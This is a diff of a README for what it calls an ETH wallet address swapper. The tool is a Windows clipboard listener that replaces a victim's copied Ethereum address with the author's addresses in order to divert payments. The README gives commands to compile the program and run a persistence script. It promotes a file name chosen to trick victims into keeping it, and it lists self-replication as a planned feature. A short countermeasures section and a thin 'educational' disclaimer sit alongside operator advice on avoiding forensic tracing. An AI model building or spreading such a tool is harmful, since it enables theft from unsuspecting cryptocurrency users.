@@ -1,5 +1,12 @@
-## DISCLAIMER
-**THIS WAS CREATED SOLELY FOR EDUCATIONAL PURPOSES AND IS NOT TO BE USED ELSEWHERE. DO NOT USE THIS FOR ILLEGAL PURPOSES, PERIOD! ONLY OPERABLE ON WINDOWS OS!**
+# :skull_and_crossbones: (ETH) WALLET ADDRESS SWAPPER :skull_and_crossbones:
+ 
+
+
+
+### DISCLAIMER
+**_THIS WAS CREATED SOLELY FOR EDUCATIONAL PURPOSES AND IS NOT TO BE USED ELSEWHERE. DO NOT USE THIS FOR ILLEGAL PURPOSES, PERIOD! ONLY OPERABLE ON WINDOWS OS!_**
+
+
 
 
 
@@ -14,6 +21,9 @@ This is where this listener exploit becomes advantageous.
 Viewing this list should open your eyes to the yield potency behind this exploit if it were to live on a number of machines)
 
 
+
+
+
 ## SUMMARY
 This application is a clipboard listener that swaps the client ethereum's wallet address
 with wallet addresses declared within program. If host does not perform his/her due diligence
@@ -24,16 +34,26 @@ As a warning, ramifications are not yet explored and there is a probability that
 some crypto forensic agency that can associate wallet to an IP addresses so proceed with caution!!!
 
 
+
+
+
 ## COUNTERMEASURES IF INFECTED
 If infected, you can painstakingly type out your address when doing a transaction or
 copy the address in parts; the ladder being the most efficient.
 
 
+
+
+
 ## HOW TO OPERATE
-``` csc .\sys_host_dl_v4.0.30319_69.cs
+``` 
+csc .\sys_host_dl_v4.0.30319_69.cs
 cd src/main/c#/scripts/powershell
 ./sys_host_dl_v4.0.30319_64_persistence.ps1
 ```
+
+
+
 
 ## FEATURES
     -light memory footprint (7KB file size that uses about 16-19% processor utilization with RAM usage recorded around 3.7MB)
@@ -42,6 +62,9 @@ cd src/main/c#/scripts/powershell
 	This ensures the script's continuity as the victim will always be under the surveillance of the script's listener.
     -executable name is social engineered for host to believe this file belongs to the system.
      	Thus inexperienced victims may be hesitant to delete it due to the potential of their computer being inoperative.
+
+
+
 
  
 ## ROBUST FEATURES YET TO BE ADDED
@@ -52,6 +75,9 @@ cd src/main/c#/scripts/powershell
     -self-replicating file upon deletion
     -perform thorough performance testing (Is ram/cpu usage intensive or disruptive when host uses other apps?
 					   Does it crash after a certain span of time? If so, why?)
+
+
+
 
 
 ## WARNING
